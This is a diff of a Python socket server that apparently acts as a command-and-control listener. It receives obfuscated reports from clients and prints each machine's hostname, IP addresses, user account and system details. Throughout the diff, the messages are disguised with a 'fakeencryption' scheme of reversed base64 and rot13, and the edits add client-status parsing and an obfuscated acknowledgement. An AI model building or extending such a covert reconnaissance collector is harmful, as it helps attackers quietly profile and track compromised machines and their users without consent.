@@ -24,12 +24,9 @@ def comms_send(data):
         enc.append(enc_c)
     conn.sendall(codecs.encode(base64.urlsafe_b64encode("".join(enc))[::-1], "rot_13"))
 
-
-host = ''
-port = 65533
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.bind((host, port))
-s.listen(-1) ####???????? Can we do infinity?
+s.bind(("", 65533))
+s.listen(-1)  # ???????? Can we do infinity?
 while True:
     conn, addr = s.accept()
     print("\n")
@@ -37,8 +34,10 @@ while True:
     while True:
         data = conn.recv(1024)
         if not data: break
-        clienthostname, clientip_lan, clientip_all, clientusername, clientuserdomain, clientsystem = fakeencryption_decode(
-            data).split("::")
+        clientstatus, _, clientdetails = fakeencryption_decode(data).partition(":::")  # Extracts client status
+        clienthostname, clientip_lan, clientip_all, clientusername, clientuserdomain, clientsystem = clientdetails.split(
+            "::")  # Extract client details
+        print(clientstatus)
         print("Hostname: " + clienthostname)
         print("Local IP: " + clientip_lan)
         print("All IP addresses: " + clientip_all)
@@ -47,6 +46,6 @@ while True:
         print("Account: " + (
             (clientuserdomain + "\\" + clientusername) if clientuserdomain != "{unknown}" else clientusername))
         print("Client System: " + clientsystem)
-        #conn.sendall(b"Acknowledged!")
-        comms_send(b'acknowledged!')
+        # conn.sendall(b"Acknowledged!")
+        comms_send(b'acknowledged!')  # Tell client that the request was successfully received
     conn.close()
